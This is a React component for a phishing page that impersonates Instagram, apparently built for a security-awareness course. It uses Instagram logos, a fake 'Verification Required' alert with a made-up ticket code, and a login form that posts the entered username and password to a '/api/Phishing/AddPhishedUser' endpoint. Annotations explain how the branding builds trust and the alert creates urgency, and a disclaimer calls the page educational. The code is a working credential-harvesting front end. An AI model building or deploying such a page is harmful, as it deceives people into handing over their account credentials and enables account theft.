import axios from 'axios';
import React, { useState } from 'react'

export default function Instagram() {
    const [Username, setUsername] = useState('Username');
    const [Password, setPassword] = useState('Password');
    function OnUserNameChange(event: React.ChangeEvent<HTMLInputElement>) {
        setUsername(event.target.value);
    }
    function OnPasswordChange(event: React.ChangeEvent<HTMLInputElement>) {
        setPassword(event.target.value);
    }
    function OnSubmit() {
        let userData:any  = {Username, Password};
        axios.post('/api/Phishing/AddPhishedUser', userData)
        .then(function () {
            alert("Thanks for submitting your information. We will get back to you soon.")
        })
        .catch(function (error) {
            alert(error)
        });
    }
    return (
        <div>
            <div className='border border-5 border-danger'>
                <h2>Disclaimer: This website was made for educational purposes</h2>
                <p>Please DO NOT introduce any type of real data on it.</p>
            </div>
            <div className='container p-5 text-center border border-3 rounded my-5 w-50 shadow'>
                <img src="https://freepngimg.com/thumb/logo/70011-instagram-script-typeface-myfonts-user-logo-font.png" className='img-fluid w-50' />
                <br></br>
                <div className='border border-success border-3'>
                    <small>As much branding is necessary for the user to trust the site. They trust instagram and the logo is what represents them.</small>
                </div>
                <hr></hr>
                <h3 className='text-danger'>Verification Required</h3>
                <h5>We have detected an irregular attempt to log into your account.</h5>
                <p className='text-black-50'>A report ticket has been initiaded with the code: IG476758.</p>
                <p>Log in to start the support process.</p>
                <div className='border border-success border-3'>
                    <small>This message gives the user urgency. They think somebody has compromised their account and they need to do something about it.</small>
                </div>
                <div className='my-2'>
                    <input className="w-50" type="text" name="name" value={Username} onChange={OnUserNameChange}/>
                </div>
                <div className='my-2'>
                    <input className="w-50" type="text" name="name" value={Password} onChange={OnPasswordChange}/>
                </div>
                <div className='my-2'>
                    <button className="btn btn-primary w-50" type="submit" value="Submit" onClick={OnSubmit}>Submit</button>
                </div>
                <img src="https://scontent-sjc3-1.xx.fbcdn.net/v/t39.8562-6/148701539_3724512380920015_7768163355512350905_n.png?_nc_cat=110&amp;ccb=1-5&amp;_nc_sid=6825c5&amp;_nc_ohc=JVYb8-KnoCcAX_d39zW&amp;_nc_ht=scontent-sjc3-1.xx&amp;oh=00_AT9pUBte2O40wq69sPwyBPHLtriuog-h2I1HScECMUJweg&amp;oe=624C58CD"
                    className='img-fluid my-2 rounded' />
                <p className='text-black-50'>© 2022 Instagram from Meta</p>
                <div className='border border-success border-3'>
                    <small>Again, more branding nonsense.</small>
                </div>
            </div>
        </div>
    )
}
